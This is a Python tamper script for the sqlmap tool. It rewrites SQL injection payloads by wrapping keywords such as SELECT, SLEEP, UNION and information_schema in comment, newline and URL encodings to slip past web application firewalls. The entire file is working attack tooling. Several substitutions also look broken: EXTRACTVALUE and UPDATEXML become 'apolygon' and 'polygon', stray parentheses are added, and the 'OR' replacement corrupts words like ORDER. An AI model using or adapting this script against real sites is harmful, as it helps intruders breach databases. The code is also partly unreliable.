#!/usr/bin/env python
import  re
"""
write by kill02lc
"""
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.LOW


def dependencies():
    pass
def tamper(payload,**kwargs):
    if payload:
        payload = payload.replace("=", "/*!%0a=*/")
        payload = payload.replace("AND", "%26%26")
        payload = payload.replace("OR", "%7c%7c")
        payload = payload.replace("SELECT","/*%0aSELECT*/")
        payload = payload.replace('UNION ALL', 'union')
        payload = payload.replace("SLEEP","/*%0aSLEEP*/")
        payload = payload.replace("LIKE", "/*!%0alike*/")
        payload = payload.replace("CONCAT", "CONCAT/*%0a*/(")
        payload = payload.replace("DATABASE(","DATABASE/*%0a*/(")
        payload = payload.replace("GROUP BY", "/*%0aGROUP*/BY")
        payload = payload.replace("ORDER BY","/*%0aORDER*/BY")
        payload = payload.replace("COUNT","/*%0aCOUNT*/")
        payload = payload.replace("USER(", "USER/*!%0a*/(")
        payload = payload.replace("BENCHMARK(", "BENCHMARK/*!%0a(*/")
        payload = payload.replace("EXP", "/*%0aEXP*/")
        payload = payload.replace("EXTRACTVALUE", "/*!%0aapolygon*/")
        payload = payload.replace("UPDATEXML", "/*!%0apolygon*/")
        payload = payload.replace("VERSION(", "VERSION/*!%0a*/(")
        payload = payload.replace("information_schema", "/*!%0ainformation_schema*/(")

    return payload
